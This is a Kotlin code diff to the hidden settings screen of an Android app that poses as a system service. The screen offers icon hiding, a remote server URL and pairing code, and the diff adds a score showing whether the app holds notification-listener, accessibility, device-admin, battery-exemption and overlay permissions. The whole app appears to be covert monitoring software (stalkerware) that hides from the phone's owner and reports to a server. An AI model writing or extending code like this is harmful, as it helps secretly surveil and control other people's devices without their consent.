@@ -4,10 +4,14 @@ import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import com.system.service.R
 import com.system.service.core.CoreService
+import com.system.service.core.ScoreCircleView
+import com.system.service.monitors.NotificationMonitor
 
 class HiddenSettingsActivity : AppCompatActivity() {
 
@@ -16,13 +20,31 @@ class HiddenSettingsActivity : AppCompatActivity() {
         setContentView(R.layout.activity_hidden_settings)
         title = "System Settings"
 
-        val etUrl      = findViewById<EditText>(R.id.etServerUrl)
-        val etPairCode = findViewById<EditText>(R.id.etPairCode)
-        val btnSave    = findViewById<Button>(R.id.btnSaveUrl)
-        val btnShow    = findViewById<Button>(R.id.btnShowIcon)
-        val btnHide    = findViewById<Button>(R.id.btnHideIcon)
-        val btnRestart = findViewById<Button>(R.id.btnRestart)
-        val tvStatus   = findViewById<TextView>(R.id.tvConnStatus)
+        val scoreCircle = findViewById<ScoreCircleView>(R.id.scoreCircle)
+        val etUrl       = findViewById<EditText>(R.id.etServerUrl)
+        val etPairCode  = findViewById<EditText>(R.id.etPairCode)
+        val btnSave     = findViewById<Button>(R.id.btnSaveUrl)
+        val btnShow     = findViewById<Button>(R.id.btnShowIcon)
+        val btnHide     = findViewById<Button>(R.id.btnHideIcon)
+        val btnRestart  = findViewById<Button>(R.id.btnRestart)
+        val tvStatus    = findViewById<TextView>(R.id.tvConnStatus)
+
+        // Animate permission health score (20 pts each × 5 permissions)
+        scoreCircle.post {
+            var score = 0
+            val notifCn = ComponentName(this, NotificationMonitor::class.java)
+            val notifFlat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+            if (notifFlat?.contains(notifCn.flattenToString()) == true) score += 20
+            val accCn = ComponentName(packageName, "com.system.service.monitors.AccessibilityMonitor")
+            val accEnabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
+            if (accEnabled.contains(accCn.flattenToString())) score += 20
+            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            if (dpm.isAdminActive(ComponentName(this, com.system.service.core.DeviceAdminReceiver::class.java))) score += 20
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (pm.isIgnoringBatteryOptimizations(packageName)) score += 20
+            if (Settings.canDrawOverlays(this)) score += 20
+            scoreCircle.animateTo(score)
+        }
 
         val prefs = getSharedPreferences(CoreService.PREFS_NAME, MODE_PRIVATE)
         etUrl.setText(prefs.getString(CoreService.KEY_SERVER_URL, CoreService.SERVER_URL))
